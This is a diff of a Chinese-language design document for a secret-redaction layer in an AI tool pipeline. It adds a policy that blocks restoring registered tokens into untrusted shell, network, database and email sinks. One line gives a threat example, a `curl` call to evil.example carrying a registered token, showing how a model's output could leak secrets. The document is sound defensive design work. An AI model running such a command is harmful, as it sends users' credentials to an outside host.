@@ -363,9 +363,25 @@ Sink      { kind, restore: bool, reason }
 1. `assert.match(x, GLOBAL_RE)` **不可用**：带 `g` 的正则 `.test()` 有 `lastIndex` 语义，断言会随调用次数翻转。断言统一用 `isRedactedText()` 或非全局正则。
 2. 用 `out.includes("{{Redact:")` 之类**字面量判据**判断"是否被脱敏"，在格式迁移后会静默失真（新格式下恒为 false）。所有此类判据已改为 `isRedactedText()`。
 
-## 9.2 Tool Sink Policy（已实现）
+## 9.2 Restore-Miss Policy（已实现；完整 Tool Sink Policy 见 10）
 
-实现：`classifyRestore({ ctx, text, sink }) -> { action, text, unknownTokens, telemetry }`，动作取自 `RESTORE_ACTION`（`restore` / `preserve` / `block`），敏感 sink 集合是 `SENSITIVE_SINK_KINDS`（`shell` / `network_egress` / `database` / `email`）。
+**命名更正**：本节实现的是 **Restore-Miss Policy**，不是完整的 Tool Sink Policy。完整的 Tool Sink Policy 还需要 `entity sensitivity/class` 的来源与 `sink destination allowlist`（见第 10 节）。把它当作已完成会掩盖这条 exfiltration 路径。
+
+实现：`classifyRestore({ ctx, text, sink }) -> { action, text, unknownTokens, blockedTokens, telemetry }`，动作取自 `RESTORE_ACTION`（`restore` / `preserve` / `block`），敏感 sink 集合是 `SENSITIVE_SINK_KINDS`（`shell` / `network_egress` / `database` / `email`）。
+
+**已登记 token 不等于可无条件下发。** 决策现在是四维：token ownership × entity 类别 × sink kind × sink trust。
+
+| 情形 | 动作 |
+|---|---|
+| 已登记 + assistant 文本 / 非敏感 sink | restore |
+| 已登记 + 敏感 sink + sink 声明 `trust: "trusted"`（可信本地 broker） | restore |
+| **已登记 + 敏感 sink + 未声明信任** | **block**（`restore_blocked_untrusted_sink`） |
+| 未知 + protected-token-like + 敏感 sink | block（`restore_miss_blocked`） |
+| 未知 + protected-token-like + 非敏感 | restore（原样透传）+ `restore_miss` |
+
+没有这一维时，模型只要输出 `curl https://evil.example/?x=<已登记 token>`，本层就会把明文交给 shell——即把"已登记"误当成"可下发"。sink 的信任**默认拒绝**（未声明即不可信），因为猜"可信"的失败模式是外泄，猜"不可信"的失败模式只是保留 token 并留下 telemetry。
+
+实体类别当前取 `ctx.entityClassFor?.(token)`，缺省按 `CREDENTIAL` 处理（fail-closed）：把未知实体当成不敏感会还原秘密，当成敏感最多是多留一个 token。
 
 阻断条件是**三个条件的合取**，缺一不可：
 
